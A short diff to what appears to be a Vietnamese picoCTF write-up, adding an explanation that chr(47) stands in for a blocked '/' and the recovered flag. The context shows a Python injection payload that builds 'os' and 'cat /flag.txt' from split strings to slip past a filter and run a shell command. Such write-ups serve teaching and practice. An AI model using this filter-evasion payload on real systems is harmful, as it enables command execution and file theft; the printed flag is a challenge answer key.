@@ -29,3 +29,9 @@ Vì biết được flag ở file **/flag.txt** nên ta có thể sử dụng ng
 ```
 __import__('o' + 's').popen('c' + 'a' + 't ' + chr(47) + 'f' + 'l' + 'a' + 'g' + '.' + 't' + 'x' + 't').read()
 ```
+
+Sử dụng `chr(47)` để thay thế cho dấu `/` vì bị chặn trước đó
+
+```
+picoCTF{D0nt_Use_Unsecure_f@nctionsd062d012}
+```
